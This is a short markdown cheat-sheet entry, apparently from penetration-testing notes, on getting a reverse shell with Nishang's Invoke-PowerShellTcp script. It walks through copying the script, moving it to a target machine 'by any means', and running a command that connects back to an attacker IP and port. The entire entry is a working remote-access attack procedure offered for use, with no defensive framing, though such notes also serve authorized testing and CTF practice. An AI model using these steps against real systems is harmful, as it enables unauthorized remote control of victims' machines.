# Reverse Shells

* [Nishang Invoke PowerShell TCP](#nishang-invoke-powershell-tcp)
* 


## Nishang Invoke PowerShell TCP

1. Paste this nishang file into a blank text document: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
2. Name it "Invoke-PowerShellTcp.ps1" (remove quotes) (You can name it whatever you want as long as it has the .ps1 file extension. Make sure you change the command as well)
3. Transfer it to target machine by any means.
4. Have the target machine trigger this command:
```
Invoke-PowerShellTcp -Reverse -IPAddress [ATTACK-IP] -Port [PORT]
```
